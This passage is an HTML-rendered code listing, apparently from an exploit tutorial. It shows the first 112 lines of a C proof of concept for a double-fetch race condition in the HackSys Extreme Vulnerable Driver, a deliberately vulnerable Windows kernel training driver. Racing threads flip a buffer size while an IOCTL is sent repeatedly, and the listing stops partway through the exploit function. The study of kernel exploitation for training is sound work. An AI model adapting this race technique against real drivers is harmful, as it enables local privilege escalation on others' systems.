<span class="normal"><a href="#__codelineno-14-31"> 31</a></span>
<span class="normal"><a href="#__codelineno-14-32"> 32</a></span>
<span class="normal"><a href="#__codelineno-14-33"> 33</a></span>
<span class="normal"><a href="#__codelineno-14-34"> 34</a></span>
<span class="normal"><a href="#__codelineno-14-35"> 35</a></span>
<span class="normal"><a href="#__codelineno-14-36"> 36</a></span>
<span class="normal"><a href="#__codelineno-14-37"> 37</a></span>
<span class="normal"><a href="#__codelineno-14-38"> 38</a></span>
<span class="normal"><a href="#__codelineno-14-39"> 39</a></span>
<span class="normal"><a href="#__codelineno-14-40"> 40</a></span>
<span class="normal"><a href="#__codelineno-14-41"> 41</a></span>
<span class="normal"><a href="#__codelineno-14-42"> 42</a></span>
<span class="normal"><a href="#__codelineno-14-43"> 43</a></span>
<span class="normal"><a href="#__codelineno-14-44"> 44</a></span>
<span class="normal"><a href="#__codelineno-14-45"> 45</a></span>
<span class="normal"><a href="#__codelineno-14-46"> 46</a></span>
<span class="normal"><a href="#__codelineno-14-47"> 47</a></span>
<span class="normal"><a href="#__codelineno-14-48"> 48</a></span>
<span class="normal"><a href="#__codelineno-14-49"> 49</a></span>
<span class="normal"><a href="#__codelineno-14-50"> 50</a></span>
<span class="normal"><a href="#__codelineno-14-51"> 51</a></span>
<span class="normal"><a href="#__codelineno-14-52"> 52</a></span>
<span class="normal"><a href="#__codelineno-14-53"> 53</a></span>
<span class="normal"><a href="#__codelineno-14-54"> 54</a></span>
<span class="normal"><a href="#__codelineno-14-55"> 55</a></span>
<span class="normal"><a href="#__codelineno-14-56"> 56</a></span>
<span class="normal"><a href="#__codelineno-14-57"> 57</a></span>
<span class="normal"><a href="#__codelineno-14-58"> 58</a></span>
<span class="normal"><a href="#__codelineno-14-59"> 59</a></span>
<span class="normal"><a href="#__codelineno-14-60"> 60</a></span>
<span class="normal"><a href="#__codelineno-14-61"> 61</a></span>
<span class="normal"><a href="#__codelineno-14-62"> 62</a></span>
<span class="normal"><a href="#__codelineno-14-63"> 63</a></span>
<span class="normal"><a href="#__codelineno-14-64"> 64</a></span>
<span class="normal"><a href="#__codelineno-14-65"> 65</a></span>
<span class="normal"><a href="#__codelineno-14-66"> 66</a></span>
<span class="normal"><a href="#__codelineno-14-67"> 67</a></span>
<span class="normal"><a href="#__codelineno-14-68"> 68</a></span>
<span class="normal"><a href="#__codelineno-14-69"> 69</a></span>
<span class="normal"><a href="#__codelineno-14-70"> 70</a></span>
<span class="normal"><a href="#__codelineno-14-71"> 71</a></span>
<span class="normal"><a href="#__codelineno-14-72"> 72</a></span>
<span class="normal"><a href="#__codelineno-14-73"> 73</a></span>
<span class="normal"><a href="#__codelineno-14-74"> 74</a></span>
<span class="normal"><a href="#__codelineno-14-75"> 75</a></span>
<span class="normal"><a href="#__codelineno-14-76"> 76</a></span>
<span class="normal"><a href="#__codelineno-14-77"> 77</a></span>
<span class="normal"><a href="#__codelineno-14-78"> 78</a></span>
<span class="normal"><a href="#__codelineno-14-79"> 79</a></span>
<span class="normal"><a href="#__codelineno-14-80"> 80</a></span>
<span class="normal"><a href="#__codelineno-14-81"> 81</a></span>
<span class="normal"><a href="#__codelineno-14-82"> 82</a></span>
<span class="normal"><a href="#__codelineno-14-83"> 83</a></span>
<span class="normal"><a href="#__codelineno-14-84"> 84</a></span>
<span class="normal"><a href="#__codelineno-14-85"> 85</a></span>
<span class="normal"><a href="#__codelineno-14-86"> 86</a></span>
<span class="normal"><a href="#__codelineno-14-87"> 87</a></span>
<span class="normal"><a href="#__codelineno-14-88"> 88</a></span>
<span class="normal"><a href="#__codelineno-14-89"> 89</a></span>
<span class="normal"><a href="#__codelineno-14-90"> 90</a></span>
<span class="normal"><a href="#__codelineno-14-91"> 91</a></span>
<span class="normal"><a href="#__codelineno-14-92"> 92</a></span>
<span class="normal"><a href="#__codelineno-14-93"> 93</a></span>
<span class="normal"><a href="#__codelineno-14-94"> 94</a></span>
<span class="normal"><a href="#__codelineno-14-95"> 95</a></span>
<span class="normal"><a href="#__codelineno-14-96"> 96</a></span>
<span class="normal"><a href="#__codelineno-14-97"> 97</a></span>
<span class="normal"><a href="#__codelineno-14-98"> 98</a></span>
<span class="normal"><a href="#__codelineno-14-99"> 99</a></span>
<span class="normal"><a href="#__codelineno-14-100">100</a></span>
<span class="normal"><a href="#__codelineno-14-101">101</a></span>
<span class="normal"><a href="#__codelineno-14-102">102</a></span>
<span class="normal"><a href="#__codelineno-14-103">103</a></span>
<span class="normal"><a href="#__codelineno-14-104">104</a></span>
<span class="normal"><a href="#__codelineno-14-105">105</a></span>
<span class="normal"><a href="#__codelineno-14-106">106</a></span>
<span class="normal"><a href="#__codelineno-14-107">107</a></span>
<span class="normal"><a href="#__codelineno-14-108">108</a></span>
<span class="normal"><a href="#__codelineno-14-109">109</a></span>
<span class="normal"><a href="#__codelineno-14-110">110</a></span>
<span class="normal"><a href="#__codelineno-14-111">111</a></span>
<span class="normal"><a href="#__codelineno-14-112">112</a></span>
<span class="normal"><a href="#__codelineno-14-113">113</a></span>
<span class="normal"><a href="#__codelineno-14-114">114</a></span>
<span class="normal"><a href="#__codelineno-14-115">115</a></span>
<span class="normal"><a href="#__codelineno-14-116">116</a></span>
<span class="normal"><a href="#__codelineno-14-117">117</a></span>
<span class="normal"><a href="#__codelineno-14-118">118</a></span>
<span class="normal"><a href="#__codelineno-14-119">119</a></span>
<span class="normal"><a href="#__codelineno-14-120">120</a></span>
<span class="normal"><a href="#__codelineno-14-121">121</a></span>
<span class="normal"><a href="#__codelineno-14-122">122</a></span>
<span class="normal"><a href="#__codelineno-14-123">123</a></span>
<span class="normal"><a href="#__codelineno-14-124">124</a></span>
<span class="normal"><a href="#__codelineno-14-125">125</a></span>
<span class="normal"><a href="#__codelineno-14-126">126</a></span>
<span class="normal"><a href="#__codelineno-14-127">127</a></span>
<span class="normal"><a href="#__codelineno-14-128">128</a></span>
<span class="normal"><a href="#__codelineno-14-129">129</a></span>
<span class="normal"><a href="#__codelineno-14-130">130</a></span>
<span class="normal"><a href="#__codelineno-14-131">131</a></span>
<span class="normal"><a href="#__codelineno-14-132">132</a></span>
<span class="normal"><a href="#__codelineno-14-133">133</a></span>
<span class="normal"><a href="#__codelineno-14-134">134</a></span>
<span class="normal"><a href="#__codelineno-14-135">135</a></span>
<span class="normal"><a href="#__codelineno-14-136">136</a></span>
<span class="normal"><a href="#__codelineno-14-137">137</a></span>
<span class="normal"><a href="#__codelineno-14-138">138</a></span>
<span class="normal"><a href="#__codelineno-14-139">139</a></span>
<span class="normal"><a href="#__codelineno-14-140">140</a></span>
<span class="normal"><a href="#__codelineno-14-141">141</a></span>
<span class="normal"><a href="#__codelineno-14-142">142</a></span>
<span class="normal"><a href="#__codelineno-14-143">143</a></span>
<span class="normal"><a href="#__codelineno-14-144">144</a></span>
<span class="normal"><a href="#__codelineno-14-145">145</a></span>
<span class="normal"><a href="#__codelineno-14-146">146</a></span>
<span class="normal"><a href="#__codelineno-14-147">147</a></span>
<span class="normal"><a href="#__codelineno-14-148">148</a></span>
<span class="normal"><a href="#__codelineno-14-149">149</a></span>
<span class="normal"><a href="#__codelineno-14-150">150</a></span>
<span class="normal"><a href="#__codelineno-14-151">151</a></span>
<span class="normal"><a href="#__codelineno-14-152">152</a></span>
<span class="normal"><a href="#__codelineno-14-153">153</a></span>
<span class="normal"><a href="#__codelineno-14-154">154</a></span>
<span class="normal"><a href="#__codelineno-14-155">155</a></span>
<span class="normal"><a href="#__codelineno-14-156">156</a></span>
<span class="normal"><a href="#__codelineno-14-157">157</a></span>
<span class="normal"><a href="#__codelineno-14-158">158</a></span>
<span class="normal"><a href="#__codelineno-14-159">159</a></span>
<span class="normal"><a href="#__codelineno-14-160">160</a></span>
<span class="normal"><a href="#__codelineno-14-161">161</a></span>
<span class="normal"><a href="#__codelineno-14-162">162</a></span>
<span class="normal"><a href="#__codelineno-14-163">163</a></span>
<span class="normal"><a href="#__codelineno-14-164">164</a></span>
<span class="normal"><a href="#__codelineno-14-165">165</a></span>
<span class="normal"><a href="#__codelineno-14-166">166</a></span>
<span class="normal"><a href="#__codelineno-14-167">167</a></span>
<span class="normal"><a href="#__codelineno-14-168">168</a></span>
<span class="normal"><a href="#__codelineno-14-169">169</a></span>
<span class="normal"><a href="#__codelineno-14-170">170</a></span>
<span class="normal"><a href="#__codelineno-14-171">171</a></span>
<span class="normal"><a href="#__codelineno-14-172">172</a></span>
<span class="normal"><a href="#__codelineno-14-173">173</a></span>
<span class="normal"><a href="#__codelineno-14-174">174</a></span>
<span class="normal"><a href="#__codelineno-14-175">175</a></span>
<span class="normal"><a href="#__codelineno-14-176">176</a></span>
<span class="normal"><a href="#__codelineno-14-177">177</a></span>
<span class="normal"><a href="#__codelineno-14-178">178</a></span>
<span class="normal"><a href="#__codelineno-14-179">179</a></span>
<span class="normal"><a href="#__codelineno-14-180">180</a></span>
<span class="normal"><a href="#__codelineno-14-181">181</a></span>
<span class="normal"><a href="#__codelineno-14-182">182</a></span>
<span class="normal"><a href="#__codelineno-14-183">183</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;Windows.h&gt;</span><span class="cp"></span>
<a id="__codelineno-14-2" name="__codelineno-14-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<a id="__codelineno-14-3" name="__codelineno-14-3"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;processthreadsapi.h&gt;</span><span class="cp"></span>
<a id="__codelineno-14-4" name="__codelineno-14-4"></a>
<a id="__codelineno-14-5" name="__codelineno-14-5"></a><span class="cp">#define DRIVER &quot;\\\\.\\HacksysExtremeVulnerableDriver&quot;</span>
<a id="__codelineno-14-6" name="__codelineno-14-6"></a><span class="cp">#define IOCTL_CODE 0x222037</span>
<a id="__codelineno-14-7" name="__codelineno-14-7"></a>
<a id="__codelineno-14-8" name="__codelineno-14-8"></a><span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">_USER_DOUBLE_FETCH</span><span class="w"></span>
<a id="__codelineno-14-9" name="__codelineno-14-9"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-14-10" name="__codelineno-14-10"></a><span class="w">    </span><span class="n">LPVOID</span><span class="w">  </span><span class="n">Buffer</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-14-11" name="__codelineno-14-11"></a><span class="w">    </span><span class="n">SIZE_T</span><span class="w">  </span><span class="n">Size</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-14-12" name="__codelineno-14-12"></a><span class="p">}</span><span class="w"> </span><span class="n">USER_DOUBLE_FETCH</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">PUSER_DOUBLE_FETCH</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-14-13" name="__codelineno-14-13"></a>
<a id="__codelineno-14-14" name="__codelineno-14-14"></a><span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">_IO_THREAD_PARAM</span><span class="w"></span>
<a id="__codelineno-14-15" name="__codelineno-14-15"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-14-16" name="__codelineno-14-16"></a><span class="w">    </span><span class="n">HANDLE</span><span class="w">              </span><span class="n">DriverHandle</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-14-17" name="__codelineno-14-17"></a><span class="w">    </span><span class="n">PUSER_DOUBLE_FETCH</span><span class="w">  </span><span class="n">DoubleFetch</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-14-18" name="__codelineno-14-18"></a><span class="p">}</span><span class="w"> </span><span class="n">IO_THREAD_PARAM</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">PIO_THREAD_PARAM</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-14-19" name="__codelineno-14-19"></a>
<a id="__codelineno-14-20" name="__codelineno-14-20"></a><span class="n">HANDLE</span><span class="w"> </span><span class="nf">OpenDriverHandle</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-14-21" name="__codelineno-14-21"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-14-22" name="__codelineno-14-22"></a><span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-14-23" name="__codelineno-14-23"></a><span class="w">    </span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateFileA</span><span class="p">(</span><span class="n">DRIVER</span><span class="p">,</span><span class="w"> </span><span class="n">GENERIC_READ</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">GENERIC_WRITE</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">OPEN_EXISTING</span><span class="p">,</span><span class="w"> </span><span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-14-24" name="__codelineno-14-24"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-14-25" name="__codelineno-14-25"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-14-26" name="__codelineno-14-26"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Failed to open driver handle!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-14-27" name="__codelineno-14-27"></a><span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-14-28" name="__codelineno-14-28"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-14-29" name="__codelineno-14-29"></a><span class="w">    </span><span class="k">else</span><span class="w"></span>
<a id="__codelineno-14-30" name="__codelineno-14-30"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-14-31" name="__codelineno-14-31"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Opened Driver Handle: 0x%x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">DriverHandle</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-14-32" name="__codelineno-14-32"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">DriverHandle</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-14-33" name="__codelineno-14-33"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-14-34" name="__codelineno-14-34"></a><span class="p">}</span><span class="w"></span>
<a id="__codelineno-14-35" name="__codelineno-14-35"></a>
<a id="__codelineno-14-36" name="__codelineno-14-36"></a><span class="kt">int</span><span class="w"> </span><span class="nf">CheckProcessors</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-14-37" name="__codelineno-14-37"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-14-38" name="__codelineno-14-38"></a><span class="w">    </span><span class="n">SYSTEM_INFO</span><span class="w"> </span><span class="n">SystemInfo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="w"></span>
<a id="__codelineno-14-39" name="__codelineno-14-39"></a>
<a id="__codelineno-14-40" name="__codelineno-14-40"></a><span class="w">    </span><span class="cm">/* Check if we have more than 2 processors as attack will take too long with less */</span><span class="w"></span>
<a id="__codelineno-14-41" name="__codelineno-14-41"></a><span class="w">    </span><span class="n">GetSystemInfo</span><span class="p">(</span><span class="o">&amp;</span><span class="n">SystemInfo</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-14-42" name="__codelineno-14-42"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">SystemInfo</span><span class="p">.</span><span class="n">dwNumberOfProcessors</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-14-43" name="__codelineno-14-43"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-14-44" name="__codelineno-14-44"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: You don&#39;t have enough processors, exiting!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-14-45" name="__codelineno-14-45"></a><span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-14-46" name="__codelineno-14-46"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-14-47" name="__codelineno-14-47"></a>
<a id="__codelineno-14-48" name="__codelineno-14-48"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">NumProcessors</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SystemInfo</span><span class="p">.</span><span class="n">dwNumberOfProcessors</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-14-49" name="__codelineno-14-49"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">NumProcessors</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-14-50" name="__codelineno-14-50"></a><span class="p">}</span><span class="w"></span>
<a id="__codelineno-14-51" name="__codelineno-14-51"></a>
<a id="__codelineno-14-52" name="__codelineno-14-52"></a><span class="n">DWORD</span><span class="w"> </span><span class="n">WINAPI</span><span class="w"> </span><span class="n">ChangeSizeThread</span><span class="p">(</span><span class="n">LPVOID</span><span class="w"> </span><span class="n">Size</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-14-53" name="__codelineno-14-53"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-14-54" name="__codelineno-14-54"></a><span class="w">    </span><span class="n">BOOL</span><span class="w">    </span><span class="n">ExploitSuccess</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-14-55" name="__codelineno-14-55"></a>
<a id="__codelineno-14-56" name="__codelineno-14-56"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-14-57" name="__codelineno-14-57"></a>
<a id="__codelineno-14-58" name="__codelineno-14-58"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Changing size on processor %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">GetCurrentProcessorNumber</span><span class="p">());</span><span class="w"></span>
<a id="__codelineno-14-59" name="__codelineno-14-59"></a>
<a id="__codelineno-14-60" name="__codelineno-14-60"></a><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">ExploitSuccess</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-14-61" name="__codelineno-14-61"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-14-62" name="__codelineno-14-62"></a><span class="w">        </span><span class="o">*</span><span class="p">(</span><span class="n">PULONG</span><span class="p">)</span><span class="n">Size</span><span class="w"> </span><span class="o">^=</span><span class="w"> </span><span class="mh">0x00000BB8</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-14-63" name="__codelineno-14-63"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-14-64" name="__codelineno-14-64"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">EXIT_SUCCESS</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-14-65" name="__codelineno-14-65"></a><span class="p">}</span><span class="w"></span>
<a id="__codelineno-14-66" name="__codelineno-14-66"></a>
<a id="__codelineno-14-67" name="__codelineno-14-67"></a><span class="n">DWORD</span><span class="w"> </span><span class="n">WINAPI</span><span class="w"> </span><span class="n">IoControlThread</span><span class="p">(</span><span class="n">LPVOID</span><span class="w"> </span><span class="n">IoThreadParam</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-14-68" name="__codelineno-14-68"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-14-69" name="__codelineno-14-69"></a><span class="w">    </span><span class="n">BOOL</span><span class="w">    </span><span class="n">ExploitSuccess</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-14-70" name="__codelineno-14-70"></a>
<a id="__codelineno-14-71" name="__codelineno-14-71"></a><span class="w">    </span><span class="n">PIO_THREAD_PARAM</span><span class="w"> </span><span class="n">IoControlThreadParam</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-14-72" name="__codelineno-14-72"></a><span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-14-73" name="__codelineno-14-73"></a><span class="w">    </span><span class="n">PUSER_DOUBLE_FETCH</span><span class="w"> </span><span class="n">UserDoubleFetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-14-74" name="__codelineno-14-74"></a>
<a id="__codelineno-14-75" name="__codelineno-14-75"></a><span class="w">    </span><span class="n">DWORD</span><span class="w">   </span><span class="n">BytesReturned</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-14-76" name="__codelineno-14-76"></a><span class="w">    </span><span class="kt">int</span><span class="w">     </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-14-77" name="__codelineno-14-77"></a>
<a id="__codelineno-14-78" name="__codelineno-14-78"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Sending IOCTL on processor %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">GetCurrentProcessorNumber</span><span class="p">());</span><span class="w"></span>
<a id="__codelineno-14-79" name="__codelineno-14-79"></a>
<a id="__codelineno-14-80" name="__codelineno-14-80"></a><span class="w">    </span><span class="n">IoControlThreadParam</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">PIO_THREAD_PARAM</span><span class="p">)</span><span class="n">IoThreadParam</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-14-81" name="__codelineno-14-81"></a><span class="w">    </span><span class="n">UserDoubleFetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">IoControlThreadParam</span><span class="o">-&gt;</span><span class="n">DoubleFetch</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-14-82" name="__codelineno-14-82"></a><span class="w">    </span><span class="n">DriverHandle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">IoControlThreadParam</span><span class="o">-&gt;</span><span class="n">DriverHandle</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-14-83" name="__codelineno-14-83"></a>
<a id="__codelineno-14-84" name="__codelineno-14-84"></a><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">ExploitSuccess</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-14-85" name="__codelineno-14-85"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-14-86" name="__codelineno-14-86"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">DriverHandle</span><span class="p">,</span><span class="w"> </span><span class="n">IOCTL_CODE</span><span class="p">,</span><span class="w"> </span><span class="n">UserDoubleFetch</span><span class="p">,</span><span class="w"> </span><span class="mi">3000</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">BytesReturned</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">))</span><span class="w"></span>
<a id="__codelineno-14-87" name="__codelineno-14-87"></a><span class="w">        </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-14-88" name="__codelineno-14-88"></a><span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Unable to send IOCTL to driver!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-14-89" name="__codelineno-14-89"></a><span class="w">        </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-14-90" name="__codelineno-14-90"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-14-91" name="__codelineno-14-91"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">EXIT_SUCCESS</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-14-92" name="__codelineno-14-92"></a><span class="p">}</span><span class="w"></span>
<a id="__codelineno-14-93" name="__codelineno-14-93"></a>
<a id="__codelineno-14-94" name="__codelineno-14-94"></a><span class="kt">void</span><span class="w"> </span><span class="n">exploit</span><span class="p">(</span><span class="n">DriverHandle</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-14-95" name="__codelineno-14-95"></a><span class="p">{</span><span class="w"></span>
<a id="__codelineno-14-96" name="__codelineno-14-96"></a>
<a id="__codelineno-14-97" name="__codelineno-14-97"></a><span class="w">    </span><span class="n">LPVOID</span><span class="w">  </span><span class="n">UserBuffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="w"></span>
<a id="__codelineno-14-98" name="__codelineno-14-98"></a><span class="w">    </span><span class="n">SIZE_T</span><span class="w">  </span><span class="n">UserBufferSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2048</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-14-99" name="__codelineno-14-99"></a>
<a id="__codelineno-14-100" name="__codelineno-14-100"></a><span class="w">    </span><span class="n">PIO_THREAD_PARAM</span><span class="w"> </span><span class="n">IoThreadParam</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-14-101" name="__codelineno-14-101"></a>
<a id="__codelineno-14-102" name="__codelineno-14-102"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">NumProcessors</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CheckProcessors</span><span class="p">();</span><span class="w"></span>
<a id="__codelineno-14-103" name="__codelineno-14-103"></a>
<a id="__codelineno-14-104" name="__codelineno-14-104"></a><span class="w">    </span><span class="cm">/* Allocate USER_DOUBLE_FETCH struct */</span><span class="w"></span>
<a id="__codelineno-14-105" name="__codelineno-14-105"></a><span class="w">    </span><span class="n">USER_DOUBLE_FETCH</span><span class="o">*</span><span class="w"> </span><span class="n">PtrUserDoubleFetch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">USER_DOUBLE_FETCH</span><span class="o">*</span><span class="p">)</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1000</span><span class="p">,</span><span class="w"> </span><span class="n">MEM_RESERVE</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">MEM_COMMIT</span><span class="p">,</span><span class="w"> </span><span class="n">PAGE_READWRITE</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">PAGE_NOCACHE</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-14-106" name="__codelineno-14-106"></a><span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">PtrUserDoubleFetch</span><span class="p">)</span><span class="w"></span>
<a id="__codelineno-14-107" name="__codelineno-14-107"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
<a id="__codelineno-14-108" name="__codelineno-14-108"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Unable to allocate USER_DOUBLE_FETCH struct!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
<a id="__codelineno-14-109" name="__codelineno-14-109"></a><span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
<a id="__codelineno-14-110" name="__codelineno-14-110"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
<a id="__codelineno-14-111" name="__codelineno-14-111"></a>
<a id="__codelineno-14-112" name="__codelineno-14-112"></a><span class="w">    </span><span class="cm">/* Allocate USER_DOUBLE_FETCH members */</span><span class="w"></span>
